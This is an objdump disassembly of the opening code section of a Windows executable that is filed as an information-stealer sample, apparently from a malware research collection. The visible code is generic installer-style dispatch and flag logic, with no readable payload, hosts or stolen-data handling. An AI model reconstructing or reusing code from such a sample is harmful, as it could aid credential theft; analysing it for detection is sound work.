
malware_samples/stealer/858d9aa51ece9c181be06012a00deff2f4196e531587350fc68ae4b8279677a5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d e8 ae 47 00    	mov    0x47aee8,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 1c 82 40 00    	call   *0x40821c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 f4 ae 47 00    	mov    0x47aef4,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 20 82 40 00    	call   *0x408220
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 24 82 40 00    	call   *0x408224
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 5c 80 40 00    	mov    0x40805c,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 64 80 40 00    	call   *0x408064
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 28 82 40 00    	call   *0x408228
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 54 80 40 00    	call   *0x408054
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 80 40 00    	call   *0x408050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 58 80 40 00    	call   *0x408058
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 80 40 00    	mov    0x40804c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 e0 2e 47 00       	push   $0x472ee0
  401155:	57                   	push   %edi
  401156:	ff 15 2c 82 40 00    	call   *0x40822c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 84 82 40 00    	call   *0x408284
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 28 af 47 00       	mov    0x47af28,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 40 00 00    	imul   $0x4018,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 2c af 47 00    	cmp    0x47af2c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 40 00 00    	imul   $0x4018,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 40 00 00       	add    $0x4018,%eax
  4011e1:	3b 35 2c af 47 00    	cmp    0x47af2c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 40 00 00    	imul   $0x4018,%esi,%esi
  401201:	8b 1d 28 af 47 00    	mov    0x47af28,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 2c af 47 00    	cmp    0x47af2c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 40 00 00    	imul   $0x4018,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 2c af 47 00    	cmp    0x47af2c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 28 af 47 00       	mov    0x47af28,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 2c af 47 00    	cmp    %esi,0x47af2c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 40 00 00    	add    $0x4018,%edx
  4012d5:	3b 35 2c af 47 00    	cmp    0x47af2c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 2c af 47 00    	mov    0x47af2c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 28 af 47 00    	mov    0x47af28,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 40 00 00    	add    $0x4018,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 b0 47 00       	mov    $0x47b000,%ecx
  40137b:	c1 e0 0e             	shl    $0xe,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 94 4e 00 00       	call   0x40621a
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 30 af 47 00    	mov    0x47af30,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 cc 2e 47 00    	add    %eax,0x472ecc
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 b4 2e 47 00    	push   0x472eb4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 cc 2e 47 00    	push   0x472ecc
  4013e4:	ff 15 54 81 40 00    	call   *0x408154
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 18 82 40 00    	call   *0x408218
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d f4 ae 47 00    	mov    0x47aef4,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 d0 e5 40 00       	push   $0x40e5d0
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 f1 3e 00 00       	call   0x405322
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 e8 ae 47 00       	mov    0x47aee8,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401453:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401456:	bf 00 b0 47 00       	mov    $0x47b000,%edi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0e             	shl    $0xe,%ecx
  401466:	03 cf                	add    %edi,%ecx
  401468:	8b f0                	mov    %eax,%esi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401470:	c1 e6 0e             	shl    $0xe,%esi
  401473:	89 0d 2c e6 41 00    	mov    %ecx,0x41e62c
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 f7                	add    %edi,%esi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 3b 16 00 00    	ja     0x402ac5
  40148a:	ff 24 8d d7 2a 40 00 	jmp    *0x402ad7(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 8a 3e 00 00       	call   0x405322
  401498:	e9 5a 0e 00 00       	jmp    0x4022f7
  40149d:	ff 05 ac 2e 47 00    	incl   0x472eac
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 4b 0e 00 00    	je     0x4022f7
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 94 82 40 00    	call   *0x408294
  4014b3:	e9 3f 0e 00 00       	jmp    0x4022f7
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 05 16 00 00       	jmp    0x402ad0
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 50 3e 00 00       	call   0x405322
  4014d2:	e9 ee 15 00 00       	jmp    0x402ac5
  4014d7:	53                   	push   %ebx
  4014d8:	e8 42 17 00 00       	call   0x402c1f
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 78 80 40 00    	call   *0x408078
  4014f0:	e9 d0 15 00 00       	jmp    0x402ac5
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 64 82 40 00    	call   *0x408264
  4014fe:	e9 c2 15 00 00       	jmp    0x402ac5
  401503:	c1 e0 02             	shl    $0x2,%eax
  401506:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401509:	75 26                	jne    0x401531
  40150b:	8b 88 80 af 47 00    	mov    0x47af80(%eax),%ecx
  401511:	6a 01                	push   $0x1
  401513:	89 88 c0 af 47 00    	mov    %ecx,0x47afc0(%eax)
  401519:	e8 01 17 00 00       	call   0x402c1f
  40151e:	59                   	pop    %ecx
  40151f:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401522:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401525:	89 04 8d 80 af 47 00 	mov    %eax,0x47af80(,%ecx,4)
  40152c:	e9 94 15 00 00       	jmp    0x402ac5
  401531:	8b 88 c0 af 47 00    	mov    0x47afc0(%eax),%ecx
  401537:	89 88 80 af 47 00    	mov    %ecx,0x47af80(%eax)
  40153d:	e9 83 15 00 00       	jmp    0x402ac5
  401542:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401545:	8d 34 85 80 af 47 00 	lea    0x47af80(,%eax,4),%esi
  40154c:	33 c0                	xor    %eax,%eax
  40154e:	8b 0e                	mov    (%esi),%ecx
  401550:	3b cb                	cmp    %ebx,%ecx
  401552:	0f 94 c0             	sete   %al
  401555:	23 4d e4             	and    -0x1c(%ebp),%ecx
  401558:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax
  40155c:	89 0e                	mov    %ecx,(%esi)
  40155e:	e9 6d 15 00 00       	jmp    0x402ad0
  401563:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401566:	ff 34 85 80 af 47 00 	push   0x47af80(,%eax,4)
  40156d:	56                   	push   %esi
  40156e:	e9 f8 14 00 00       	jmp    0x402a6b
  401573:	8b 0d b0 2e 47 00    	mov    0x472eb0,%ecx
  401579:	8b 35 68 82 40 00    	mov    0x408268,%esi
  40157f:	3b cb                	cmp    %ebx,%ecx
  401581:	74 09                	je     0x40158c
  401583:	ff 75 dc             	push   -0x24(%ebp)
  401586:	51                   	push   %ecx
  401587:	ff d6                	call   *%esi
  401589:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40158c:	8b 0d c4 2e 47 00    	mov    0x472ec4,%ecx
  401592:	3b cb                	cmp    %ebx,%ecx
  401594:	0f 84 2b 15 00 00    	je     0x402ac5
  40159a:	50                   	push   %eax
  40159b:	51                   	push   %ecx
  40159c:	ff d6                	call   *%esi
  40159e:	e9 22 15 00 00       	jmp    0x402ac5
  4015a3:	6a f0                	push   $0xfffffff0
  4015a5:	e8 97 16 00 00       	call   0x402c41
  4015aa:	ff 75 dc             	push   -0x24(%ebp)
  4015ad:	50                   	push   %eax
  4015ae:	ff 15 74 80 40 00    	call   *0x408074
  4015b4:	85 c0                	test   %eax,%eax
  4015b6:	0f 85 09 15 00 00    	jne    0x402ac5
  4015bc:	e9 ca 12 00 00       	jmp    0x40288b
  4015c1:	6a f0                	push   $0xfffffff0
  4015c3:	e8 79 16 00 00       	call   0x402c41
  4015c8:	50                   	push   %eax
  4015c9:	89 45 08             	mov    %eax,0x8(%ebp)
  4015cc:	e8 69 46 00 00       	call   0x405c3a
  4015d1:	8b f0                	mov    %eax,%esi
  4015d3:	3b f3                	cmp    %ebx,%esi
  4015d5:	74 5a                	je     0x401631
  4015d7:	6a 5c                	push   $0x5c
  4015d9:	56                   	push   %esi
  4015da:	e8 dd 45 00 00       	call   0x405bbc
  4015df:	8b f0                	mov    %eax,%esi
  4015e1:	66 8b 3e             	mov    (%esi),%di
  4015e4:	66 89 1e             	mov    %bx,(%esi)
  4015e7:	66 3b fb             	cmp    %bx,%di
  4015ea:	75 18                	jne    0x401604
  4015ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4015ef:	74 13                	je     0x401604
  4015f1:	e8 95 42 00 00       	call   0x40588b
  4015f6:	85 c0                	test   %eax,%eax
  4015f8:	74 0a                	je     0x401604
  4015fa:	ff 75 08             	push   0x8(%ebp)
  4015fd:	e8 ef 41 00 00       	call   0x4057f1
  401602:	eb 08                	jmp    0x40160c
  401604:	ff 75 08             	push   0x8(%ebp)
  401607:	e8 62 42 00 00       	call   0x40586e
  40160c:	3b c3                	cmp    %ebx,%eax
  40160e:	74 17                	je     0x401627
  401610:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401615:	75 0d                	jne    0x401624
  401617:	ff 75 08             	push   0x8(%ebp)
  40161a:	ff 15 94 80 40 00    	call   *0x408094
  401620:	a8 10                	test   $0x10,%al
  401622:	75 03                	jne    0x401627
  401624:	ff 45 fc             	incl   -0x4(%ebp)
  401627:	66 89 3e             	mov    %di,(%esi)
  40162a:	46                   	inc    %esi
  40162b:	46                   	inc    %esi
  40162c:	66 3b fb             	cmp    %bx,%di
  40162f:	75 a6                	jne    0x4015d7
  401631:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401634:	74 2d                	je     0x401663
  401636:	6a e6                	push   $0xffffffe6
  401638:	e8 e6 fd ff ff       	call   0x401423
  40163d:	ff 75 08             	push   0x8(%ebp)
  401640:	68 00 30 4d 00       	push   $0x4d3000
  401645:	e8 70 4c 00 00       	call   0x4062ba
  40164a:	ff 75 08             	push   0x8(%ebp)
  40164d:	ff 15 90 80 40 00    	call   *0x408090
  401653:	85 c0                	test   %eax,%eax
  401655:	0f 85 6a 14 00 00    	jne    0x402ac5
  40165b:	ff 45 fc             	incl   -0x4(%ebp)
  40165e:	e9 62 14 00 00       	jmp    0x402ac5
  401663:	6a f5                	push   $0xfffffff5
  401665:	e9 e1 0b 00 00       	jmp    0x40224b
  40166a:	53                   	push   %ebx
  40166b:	e8 d1 15 00 00       	call   0x402c41
  401670:	50                   	push   %eax
  401671:	e8 87 4f 00 00       	call   0x4065fd
  401676:	e9 89 06 00 00       	jmp    0x401d04
  40167b:	6a d0                	push   $0xffffffd0
  40167d:	e8 bf 15 00 00       	call   0x402c41
  401682:	6a df                	push   $0xffffffdf
  401684:	8b f0                	mov    %eax,%esi
  401686:	e8 b6 15 00 00       	call   0x402c41
  40168b:	6a 13                	push   $0x13
  40168d:	8b f8                	mov    %eax,%edi
  40168f:	e8 ad 15 00 00       	call   0x402c41
  401694:	57                   	push   %edi
  401695:	56                   	push   %esi
  401696:	ff 15 08 81 40 00    	call   *0x408108
  40169c:	85 c0                	test   %eax,%eax
  40169e:	74 07                	je     0x4016a7
  4016a0:	6a e3                	push   $0xffffffe3
  4016a2:	e9 a4 0b 00 00       	jmp    0x40224b
  4016a7:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4016aa:	0f 84 db 11 00 00    	je     0x40288b
  4016b0:	56                   	push   %esi
  4016b1:	e8 47 4f 00 00       	call   0x4065fd
  4016b6:	85 c0                	test   %eax,%eax
  4016b8:	0f 84 cd 11 00 00    	je     0x40288b
  4016be:	57                   	push   %edi
  4016bf:	56                   	push   %esi
  4016c0:	e8 bb 49 00 00       	call   0x406080
  4016c5:	6a e4                	push   $0xffffffe4
  4016c7:	e9 7f 0b 00 00       	jmp    0x40224b
  4016cc:	53                   	push   %ebx
  4016cd:	e8 6f 15 00 00       	call   0x402c41
  4016d2:	8b 7d f4             	mov    -0xc(%ebp),%edi
